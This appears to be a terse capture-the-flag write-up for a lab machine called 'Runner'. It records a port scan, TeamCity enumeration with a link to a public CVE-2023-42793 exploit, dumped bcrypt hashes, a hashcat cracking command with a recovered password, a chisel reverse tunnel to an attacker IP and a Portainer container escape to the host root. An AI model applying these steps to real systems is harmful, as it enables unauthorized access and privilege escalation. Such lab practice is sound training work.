## Runner Linux Machine

## target ip 

10.10.11.13

## Recon 

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt

8000/tcp open  nagios-nsca Nagios NSCA

## Enumeration
[1] - dirsearch :

[+] + showed /assets on port 80 with 403 response
[+] + http://runner.htb:8000/version ->0.0.0-src 


[2] - subdomain enumeration :

[+] http://teamcity.runner.htb/login.html 
[+] https://github.com/H454NSec/CVE-2023-42793

[3] - Pannel enumeration 

[+] + backup file download contains hashes :

		$2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye
		1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1713645873123, BCRYPT
		2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
		11, city_adminwhuv, $2a$07$eUwRkt5HJl1DZKr9py62sePYSi7sVG9sMVjZh1h4U6oIJ6IMCf0xa, , angry-admin@funnybunny.org, 1713645885602, BCRYPT
		12, h454nsec3577, $2a$07$tnObCkeqLb0uzSQPBqAubeXjiz.Z9bdsCufqs16O2fYzP9GVScGPO, , "", 1713646005818, BCRYPT
		13, h454nsec5334, $2a$07$Yr09SJ5UTG6rE6WwepYCJOE8Xpa2A4pB0u.kGqZ4ZHYIljzXh.STW, , "", 1713646174855, BCRYPT

[+] + Only mathew crackable :
hashcat64 -a 0 -m 3200 hashes.txt rockyou.txt -w 3 -O
matthew:piper123 ## useless ## 4 hours afters , its not useless lel

[+] + Find ssh key 
```bash
	ssh john@$ip -i id_rsa
```
## Foothold
[+] + Basic enumeration methodology again linpeas etc.. 
[+] + port 9000 interesting

		chisel on client :
		./chisel client http://10.10.14.14:1234 R:9000:127.0.0.1:9000 
		chisel on attacker
		./chisel server --reverse  --port 1234

[+] + login with mathew password 

[+] + no need for chisel found this -> http://portainer-administration.runner.htb/#!/home

[+] + make volume , create container , mount /mnt/root 


Nice machine !!!
